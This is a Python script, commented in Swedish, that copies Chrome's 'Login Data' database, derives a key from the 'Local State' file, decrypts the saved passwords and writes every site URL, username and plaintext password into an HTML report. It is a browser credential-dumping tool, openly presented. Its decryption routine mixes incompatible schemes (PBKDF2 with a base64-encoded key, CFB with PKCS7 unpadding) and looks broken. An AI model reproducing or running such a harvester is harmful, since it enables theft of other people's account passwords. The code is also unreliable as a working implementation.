import os
import json
import base64
import sqlite3
#import win32crypt
from Crypto.Cipher import AES
import shutil
from datetime import timezone, datetime, timedelta
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.primitives import serialization
import base64


def get_chrome_datetime(chromedate):
    """Fixar tidstämplar eftersom `chromedate` är formaterat som antalet mikrosekunder sedan januari 1601"""
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

def get_encryption_key():
    # Read the key from Local State
    with open("Local State", "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    # Decode the encryption key from Base64
    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = encrypted_key[5:]

    # Use PBKDF2 to derive the decryption key
    salt = b'saltysalt'
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA1(),
        iterations=1003,
        salt=salt,
        length=16,
    )
    key = base64.urlsafe_b64encode(kdf.derive(key))

    return key

def decrypt_password(password, key, iv_size=16):
    password = base64.b64decode(password)
    iv = password[:iv_size]
    data = password[iv_size:]

    cipher = Cipher(algorithms.AES(key), modes.CFB(iv))
    decryptor = cipher.decryptor()
    decrypted_data = decryptor.update(data) + decryptor.finalize()

    unpadder = padding.PKCS7(128).unpadder()
    decrypted_data = unpadder.update(decrypted_data) + unpadder.finalize()

    return decrypted_data.decode('utf-8')

def main():
    # hämta AES-nyckeln
    key = get_encryption_key()
    # sökväg till den lokala SQLite-databasen för Chrome
    db_path = "Login Data"
    # kopiera filen till en annan plats
    # eftersom databasen kommer att vara låst om Chrome körs för tillfället
    filename = "ChromeData.db"
    shutil.copyfile(db_path, filename)
    # anslut till databasen
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    # tabellen `logins` innehåller den data vi behöver
    cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
    # iterera över alla rader

    results = open("Results.html", "w")
    results.write("<html>\n<head>\n<title>Password Results</title>\n</head>\n<body>\n")

    for row in cursor.fetchall():
        origin_url = row[0]
        action_url = row[1]
        username = row[2]
        password = decrypt_password(row[3], key)
        date_created = row[4]
        date_last_used = row[5]

        if username or password:
            results.write(f"<p><strong>Ursprungs-URL:</strong> {origin_url}</p>\n")
            results.write(f"<p><strong>Åtgärds-URL:</strong> {action_url}</p>\n")
            results.write(f"<p><strong>Användarnamn:</strong> {username}</p>\n")
            results.write(f"<p><strong>Lösenord:</strong> {password}</p>\n")
        else:
            continue

        if date_created != 86400000000 and date_created:
            results.write(f"<p><strong>Skapades den:</strong> {str(get_chrome_datetime(date_created))}</p>\n")

        if date_last_used != 86400000000 and date_last_used:
            results.write(f"<p><strong>Senast använd:</strong> {str(get_chrome_datetime(date_last_used))}</p>\n")

        results.write("<hr>\n")

    results.write("</body>\n</html>")
    results.close()

    cursor.close()
    db.close()

    try:
        # försöker ta bort den kopierade databasfilen
        os.remove(filename)
    except:
        pass

if __name__ == "__main__":
    main()